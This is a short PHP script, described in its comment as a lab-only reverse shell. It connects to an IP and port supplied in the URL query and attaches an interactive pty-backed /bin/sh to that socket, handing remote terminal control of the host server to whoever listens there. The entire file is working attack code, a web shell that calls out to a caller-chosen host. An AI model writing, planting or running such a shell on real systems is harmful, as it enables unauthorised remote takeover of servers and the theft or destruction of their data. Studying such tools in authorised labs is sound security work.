<?php
/* Lab-only reverse shell: pty-backed /bin/sh so the operator gets a fully
   interactive terminal (cd, ls, job control, prompts). */
$ip   = $_GET['ip']   ?? '127.0.0.1';
$port = (int)($_GET['port'] ?? 4444);

$s = @fsockopen($ip, $port, $errno, $errstr, 10);
if (!$s) { http_response_code(502); exit; }

// Allocate a pty and wire it to the socket. `script` gives us a tty without
// needing to compile anything into the image.
$cmd = 'script -qfc /bin/sh /dev/null';

$spec = [0 => $s, 1 => $s, 2 => $s];
$p = @proc_open($cmd, $spec, $pipes);
if (is_resource($p)) { proc_close($p); }
fclose($s);
